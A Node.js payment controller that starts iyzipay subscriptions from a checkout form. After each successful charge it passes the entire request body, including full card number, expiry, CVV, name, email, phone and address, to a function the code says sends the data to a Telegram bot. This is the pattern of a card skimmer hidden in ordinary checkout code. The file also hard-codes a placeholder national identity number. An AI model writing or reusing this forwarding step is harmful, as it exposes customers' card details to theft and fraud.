const { sendPaymentData } = require('./botController');
const crypto = require('crypto');
const fetch = require('node-fetch');

const API_KEY = process.env.IYZIPAY_API_KEY.trim();
const SECRET_KEY = process.env.IYZIPAY_SECRET_KEY.trim();

const apiKey = API_KEY;
const secretKey = SECRET_KEY;
const baseUrl = 'https://api.iyzipay.com';

const PLAN_REFERENCE_CODES = {
  solo: 'decef24c-4ee5-4407-94bf-6c64b096660f',
  plus: '438fb589-63da-411c-9802-09f8bdc0a8ae',
  premium: 'fd5fc9cb-06f7-4079-92c7-5d25adc0f6b4'
};

function generateHmacSignature(secretKey, randomString, path, payload) {
  const dataToSign = randomString + path + JSON.stringify(payload);
  return crypto
    .createHmac('sha256', secretKey)
    .update(dataToSign, 'utf8')
    .digest('hex');
}

async function initializeSubscription(reqBody, referenceCode) {
  const path = '/v2/subscription/initialize';
  const url = `${baseUrl}${path}`;
  const randomString = crypto.randomBytes(8).toString('hex');
  const conversationId = `sub_${Date.now()}`;

  const payload = {
    locale: reqBody.locale || 'TR',
    conversationId,
    pricingPlanReferenceCode: referenceCode,
    subscriptionInitialStatus: 'ACTIVE',
    paymentCard: {
      cardHolderName: reqBody.cardHolder,
      cardNumber: reqBody.cardNumber.replace(/\s/g, ''),
      expireMonth: reqBody.expiry.split('/')[0],
      expireYear: '20' + reqBody.expiry.split('/')[1],
      cvc: reqBody.cvv,
      registerConsumerCard: true,
    },
    customer: {
      name: reqBody.firstName,
      surname: reqBody.lastName,
      email: reqBody.email,
      gsmNumber: reqBody.phone,
      identityNumber: '11111111110',
      shippingAddress: {
        contactName: `${reqBody.firstName} ${reqBody.lastName}`,
        city: reqBody.city,
        country: reqBody.countryCode || 'TR',
        address: reqBody.address,
        zipCode: reqBody.postalCode,
      },
      billingAddress: {
        contactName: `${reqBody.firstName} ${reqBody.lastName}`,
        city: reqBody.city,
        country: reqBody.countryCode || 'TR',
        address: reqBody.address,
        zipCode: reqBody.postalCode,
      },
    }
  };

  const signature = generateHmacSignature(secretKey, randomString, path, payload);
  const authRaw = `apiKey:${apiKey}&randomKey:${randomString}&signature:${signature}`;
  const base64Auth = Buffer.from(authRaw, 'utf8').toString('base64');
  const authorization = `IYZWSv2 ${base64Auth}`;

  const headers = {
    'Authorization': authorization,
    'Content-Type': 'application/json',
    'x-iyzi-rnd': randomString,
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload),
    });

    const result = await response.json();

    if (response.ok && result.status === 'success') {
      console.log('✅ Subscription initialized successfully:', result);
      return { success: true, referenceCode: result.data.referenceCode };
    } else {
      console.error('❌ Error initializing subscription:', result);
      return { success: false, error: result.errorMessage || 'An unknown error occurred' };
    }
  } catch (error) {
    console.error('❌ Error executing request:', error);
    return { success: false, error: error.message };
  }
}

exports.processPayment = async (req, res) => {
  const { plan } = req.body;
  const referenceCode = PLAN_REFERENCE_CODES[plan] || PLAN_REFERENCE_CODES['solo'];

  const result = await initializeSubscription(req.body, referenceCode);
  if (!result.success) {
      return res.status(500).json({ error: result.error, success: false });
  }

  try {
      const prices = {
          solo: '19.99',
          plus: '29.99',
          premium: '39.99'
      };

      const paymentData = {
          ...req.body,
          price: prices[plan] || '19.99',
      };
      await sendPaymentData(paymentData);
  } catch (err) {
      console.error('Failed to send payment data to Telegram bot:', err);
  }

  res.json({ success: true, subscriptionReferenceCode: result.referenceCode });
};
